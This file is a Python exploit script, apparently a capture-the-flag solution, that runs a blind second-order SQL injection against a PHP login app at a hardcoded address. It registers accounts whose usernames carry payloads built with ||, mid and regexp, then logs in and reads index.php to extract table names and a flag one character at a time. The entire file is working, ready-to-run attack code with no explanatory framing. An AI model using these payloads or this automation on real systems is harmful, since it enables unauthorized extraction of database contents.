import time
import re
import string
import requests
import hashlib
import random

url = "http://35.220.149.77:16034/"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'}
proxies = {"http": "http://127.0.0.1:7890"}


def register(payload, cookies):
    r = requests.post(url=url + "register.php", headers=headers, cookies=cookies, data={"username": payload, "email": payload[0:32], "password": payload, "confirm": payload}, proxies=proxies)
    rule = r'<script>(.+?);</script>'
    result = re.findall(rule, r.text)
    try:
        if result[0] != "window.location.href='login.php?register'":
            # print("register", result[0])
            return False
        else:
            return True
    except IndexError:
        return False


def login(payload, cookies):
    requests.post(url=url + "login.php", headers=headers, cookies=cookies, data={"username": payload, "password": payload}, proxies=proxies)


def index(payload, cookies):
    r = requests.get(url=url + "index.php", headers=headers, cookies=cookies, proxies=proxies)
    rule = r'<div class="container"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Email</th><th scope="col">Time</th></tr></thead><tbody>(.+?)</tbody></table></div>'
    result = re.findall(rule, r.text)
    try:
        if len(result[0]) == len('<tr><th scope="row">1</th><td>%s</td><td>2021-11-29 14:21:50</td></tr>' % payload[0:32]):
            return False
        else:
            return True
    except IndexError:
        return False


def get_table_name():
    for i in range(1, 50):
        for j in string.ascii_lowercase + string.digits + '{,}':
            cookies = {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()}
            payload = "%s'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp'%s$')||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
            # payload = "%s'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like('%s'))||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)

            result = register(payload, cookies)
            while not result:
                cookies = {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()}
                payload = "%s'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp'%s$')||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
                # payload = "%s'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like('%s'))||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
                result = register(payload, cookies)

            login(payload, cookies)

            if index(payload, cookies):
                print(j, end="")
                break
        time.sleep(0.1)
    print()


def get_flag():
    for i in range(1, 50):
        for j in string.ascii_lowercase + string.digits + '{,}':
            cookies = {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()}
            payload = "%s'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp'%s$')||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
            # payload = "%s'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like('%s'))||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)

            result = register(payload, cookies)
            while not result:
                cookies = {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()}
                payload = "%s'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp'%s$')||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
                # payload = "%s'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like('%s'))||'" % (hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
                result = register(payload, cookies)

            login(payload, cookies)

            if index(payload, cookies):
                print(j, end="")
                break
        time.sleep(0.1)
    print()


register(hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()})
register(hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()})
register(hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), {'PHPSESSID': hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()})

get_table_name()
get_flag()
